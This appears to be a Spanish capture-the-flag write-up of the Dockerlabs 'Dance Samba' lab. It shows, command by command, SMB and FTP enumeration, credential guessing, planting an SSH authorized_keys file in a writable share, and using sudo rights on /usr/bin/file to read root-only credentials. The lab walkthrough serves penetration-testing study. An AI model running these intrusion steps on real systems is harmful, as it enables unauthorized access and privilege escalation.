---
layout: single
title: Dance Samba: Dockerlabs
excerpt: "Esta máquina tendrá de objetivo de descubrir unas credenciales a nivel local mediante una nota cual nos dará acceso a un share."
date: 2025-10-29
classes: wide
header:
  teaser: /assets/images/dkl-writeup-dancesamba/logo_dancesamba.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs.webp
categories:
  - Dockerlabs
  - Pentesting
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - SSHclaves
  - hash
  - EscaladaPrivilegios
  - Sudo
---

## WRITE UP
IP VÍCITMA-> 172.17.0.2 (TTL 64) LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">dancesmb</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Al ser dockerlabs, vamos a descargarnos el .zip y ejecutar el contenedor:

```bash
sudo bash auto_deploy.sh dance-samba.tar
```

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 172.17.0.2
```

-Usar el comando *ping*: 

```bash
ping 172.17.0.2 -c1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, nos muestra el proceso.* 
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oG allPorts
# Veremos porque el formato grapeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

```bash
nmap -sVC -p21,22,139,445 172.17.0.2 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
``` 

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

### ANÁLISIS FTP: RECONOCIMIENTO

En el escaneo de **nmap** gracias al uso de los scripts que usa, nos detectó un login en <span style="color:blue">anoymous</span>, por ende no necesita contraseña.

Vemos que tiene una nota.

```bash
locate .nse | grep -i "ftp"
```

*En dicha ruta guarda los scripts, programados en LUA*

Podríamos usar *searchsploit* para que nos busque alguna vulnerabilidad para la versión <span style="color:yellow">v3.0.5</span> de este servicio pero no nos va a encontrar nada.

```bash
searchsploit vsftpd 3.0.5
```

### ACCESO FTP: ANONYMOUS

Antes de entrar, vamos a crear un fichero vacío para ver si tenemos privilegios de subida de archivos.

```bash
touch prueba.txt
```

```bash
# Nos logueamos sin contraseña en ftp como anonymous.
ftp 10.10.10.5
-> anonymous

# Nos descargamos la nota.
get nota.txt
```

Probamos la subida de archivos pero nos faltan permisos.

```bash
put prueba.txt
```

### ANÁLISIS SSH: RECONOCIMIENTO

Con *searchsploit* comprobamos si existen vulnerabilidades de esta versión pero no nos encontrara nada.

```bash
searchsploit openssh 9.6p1
```

### LECTURA DE ARCHIVO DESCARGADO

Leemos la nota que nos hemos descargado en busca información relevante.
Dos usuarios potenciales: <span style="color:blue">Macarena</span> y <span style="color:blue">donald</span>.

```bash
cat nota.txt
```

### ENUMERACIÓN: SMB

De primeras probaremos con <span style="color:blue">null sesión</span> para entrar a *rpcclient* y tener una posible enumeración de usuarios, grupos y información de usuarios.

```bash
rpcclient -U "" -N 172.17.0.2
```

Enumeramos los usuarios y nos listara <span style="color:blue">Macarena</span> con el **rid**: <span style="color:lime">0x3e8</span>

``enumdomusers``

Haremos una consulta al rid del usuario para entre otras cosas, ver si guarda alguna información en su descripción. (nada)

``queryuser 0x3e8``

### ANÁLISIS: SMB

Con *searchsploit* buscaremos si la versión <span style="color:yellow">v4</span> de **smb** tiene alguna vulnerabilidad, aparentemente no.

```bash
searchsploit samba 4
```

### LISTAR SHARES

Listaremos los shares con *netexec* para ver cual tenemos permisos de lectura e incluso escritura con distintos usuarios, probaremos con <span style="color:blue">null sesión</span> primero.

Lo cual nos deja listarlos pero no nos dice nada de que podamos acceder o parecido.
Aunque vemos un share <span style="color:lightblue">macarena</span>, ya nos dice que seguramente sea el home de dicho usuario.

```bash
netexec smb 172.17.0.2 -u "" -p "" --shares
```

Usaremos *smbmap* y por alguna casualidad probaremos las siguientes credenciales haber si nos deja listarlos y así mismo permisos de lectura o escritura. 

```bash
smbmap -H 172.17.0.2 -u "macarena" -p "donald"
```

Nos deja listarlos e nos dice que podemos escribir y leer el share <span style="color:lightblue">macarena</span>.
Esto nos da a entender de que el usuario del principio y con el que cual hemos listado los shares es válido dentro del dominio y ya sabemos su contraseña.

Lo comprobamos con **netexec** logueandonos y nos lo válida.

```bash
netexec smb 172.17.0.2 -u "macarena" -p "donald" 
```

### ACCESO A SHARE Y BANDERA USER

Accederemos al recurso compartido con *smbclient*:

```bash
smbclient -U "macarena" \\\\172.17.0.2\\macarena
-> donald
```

Dentro del share que es el home de este usuario, cual como podemos escribir podemos subir archivos, crear carpetas... y asi mismo ver los archivos ocultos. Nos bajamos la <span style="color:orange">flag de user</span>.

```bash
get user.txt
```

Leemos la bandera usuario que nos hemos bajado.

### GENERACIÓN DE LLAVES Y ACCESO A SSH 

Si intentamos entrar a **ssh** del usuario <span style="color:blue">macarena</span> nos dira que su identificación ha cambiado.

```bash
ssh macarena@172.17.0.2
```

Para solucionar esto entraremos a su share y crearemos el directorio <span style="color:lightblue">/.ssh/</span>.

```bash
mkdir /.ssh/
```

Después en nuestra máquina eliminaremos el Host de confianza (conocido) que es la víctima en <span style="color:grey">known_hosts</span>:

```bash
ssh-keygen -f '/home/pablo/.ssh/known_hosts' -R '172.17.0.2'
```

Ahora crearemos unas claves:

```bash
ssh-keygen  -t rsa -b 4096
```

1) <span style="color:green">-t</span>  <span style="color:purple">rsa</span> (Este tipo es porque es compatible y cifrado)

2) <span style="color:green">-b</span>  <span style="color:cyan">4096</span> (Usaremos este tamaño en bits debido a que es el más usado en servidores)

clave privada -> <span style="color:purple">yes</span>

clave pública -> <span style="color:purple">yes.pub</span>

### PASAR LLAVES A SHARE Y USARLA 

Dentro del share > <span style="color:lightblue">/.ssh/</span> llevaremos la clave pública y la llamaremos authorized_keys.

```bash
put yes.pub authorized_keys
```

Ahora nos queda usar en nuestra máquina nuestra clave privada y no nos pedirá contraseña.

```bash
ssh macarena@172.17.0.2< -i yes
```

### CRACKEAR HASH 

Si investigamos en el <span style="color:lightblue">/home</span> listando los demás usuarios veremos 2 nuevos:

1. <span style="color:blue">ftp</span> (De donde descargamos la nota del principio)
2. <span style="color:blue">secret</span> (Contiene un <span style="color:gold">hash</span>, cual tenemos que descifrar)

``MMZVM522LBFHUWSXJYYWG3KW05MVQTT2MQZDS6K2IE6T2==``

Usaremos la siguiente página para descifrarlo: [CyberChef](https://gchq.github.io/CyberChef/)

Dentro pondremos primero de <span style="color:cyan">Base32</span> y que lo pase por último por un <span style="color:cyan">Base64</span>.
La salida: <span style="color:darkred">supersecurepassword</span>

Si lo hacemos por consola sería asi:

1)  Lo pasamos por base32
``echo "MMZVM522LBFHUWSXJYYWG3KW05MVQTT2MQZDS6K2IE6T2==" | base32 -d``

2) Lo pasamos por base64
``echo "c3VwZXJzZWN1cmVwYXNzd29yZA==" | base64 -d``

Obteniendo la contraseña <span style="color:darkred">supersecurepassword</span>, finalmente.

### ESCALADA DE PRIVILEGIOS

Listaremos nuestros permisos de *sudo* a ver si podemos aprovecharnos de alguno que nos permita escalar privilegios.

```bash
sudo -l 
-> supersecurepassword
```

Tendremos el permiso sudo sobre el binario <span style="color:lightblue">/usr/bin/</span><span style="color:grey">file</span> cual podemos deducir que podremos leer archivos arbitrarios cual requieren ciertos permisos de root.

Si nos vamos a la siguiente ruta <span style="color:lightblue">/opt</span> veremos un fichero "**password.txt**".
Cual no tendremos permisos ya que solo lo puede leer el usuario <span style="color:blue">root</span>.

```bash
# Ir a al directorio /opt
cd /opt 

# Intar leer el fichero .txt
cat password.txt
```

Nos iremos al siguiente repositorio online, donde buscaremos el binario <span style="color:lime">file</span> y veremos como podemos leer archivos arbitrarios a nivel sistema: 

>https://gtfobins.github.io/gtfobins/file/#sudo

Con la siguiente sintaxis, leeremos dicho archivo arbitrario: 

```bash
sudo /usr/bin/file -f /opt/password.txt
```

Nos dará las credenciales privilegiadas -> <span style="color:blue">root</span>:<span style="color:darkred">rooteable2</span> 

Ahora ya seremos usuario con permisos privilegiados. 

``id`` para confirmar.

### BANDERA ROOT

Para coger la bandera <span style="color:blue">root</span> nos vamos a su directorio <span style="color:lightblue">/root</span>.

